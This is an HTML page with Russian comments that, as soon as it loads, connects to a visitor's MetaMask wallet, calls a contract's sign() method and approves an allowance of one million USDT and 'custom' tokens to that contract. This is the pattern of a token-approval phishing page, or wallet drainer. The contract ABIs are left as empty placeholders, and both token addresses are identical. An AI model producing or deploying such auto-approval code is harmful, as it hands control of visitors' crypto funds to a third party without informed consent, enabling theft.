<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Автоматическое Подключение и Подписание Контракта с MetaMask</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                try {
                    // Запрос на подключение к MetaMask
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    
                    // Получение подключенного аккаунта пользователя
                    const accounts = await web3.eth.getAccounts();
                    const userAddress = accounts[0];
                    console.log("Подключен аккаунт:", userAddress);

                    // Адрес и ABI вашего контракта
                    const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2"; // Адрес вашего контракта
                    const abi = [ /* Вставьте ABI вашего нового контракта здесь */ ];

                    // Создание экземпляра контракта
                    const contract = new web3.eth.Contract(abi, contractAddress);
                    
                    // Подписание контракта
                    await contract.methods.sign().send({ from: userAddress });
                    console.log("Контракт подписан пользователем:", userAddress);

                    // Предоставление разрешения на управление токенами
                    await approveTokens(contract, userAddress);
                } catch (error) {
                    console.error("Ошибка при подключении или подписании:", error);
                }
            } else {
                alert("MetaMask не найден! Пожалуйста, установите MetaMask и попробуйте снова.");
            }
        });

        async function approveTokens(contract, userAddress) {
            try {
                // Предоставление разрешения на управление токенами
                const usdtTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего USDT токена на тестовой сети
                const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения

                // Подключение контракта USDT токена для предоставления разрешения
                const usdtAbi = [ /* Вставьте ABI вашего USDT токена здесь */ ]; // ABI USDT токена
                const usdtContract = new web3.eth.Contract(usdtAbi, usdtTokenAddress);

                // Отправляем транзакцию для предоставления разрешения на управление USDT токенами
                const approveTx = await usdtContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
                console.log("Доступ к USDT токенам предоставлен для контракта:", contract.options.address);

                // Аналогично для Custom Token
                const customTokenAbi = [ /* Вставьте ABI вашего Custom Token здесь */ ]; // ABI вашего Custom Token
                const customTokenContract = new web3.eth.Contract(customTokenAbi, customTokenAddress);

                // Отправляем транзакцию для предоставления разрешения на управление Custom Token
                const approveCustomTx = await customTokenContract.methods.approve(contract.options.address, amountToApprove).send({ from: userAddress });
                console.log("Доступ к Custom Token предоставлен для контракта:", contract.options.address);

                alert("Контракт успешно подписан и доступ предоставлен!");

            } catch (error) {
                console.error("Ошибка при предоставлении разрешения на управление токенами:", error);
            }
        }
    </script>
</head>
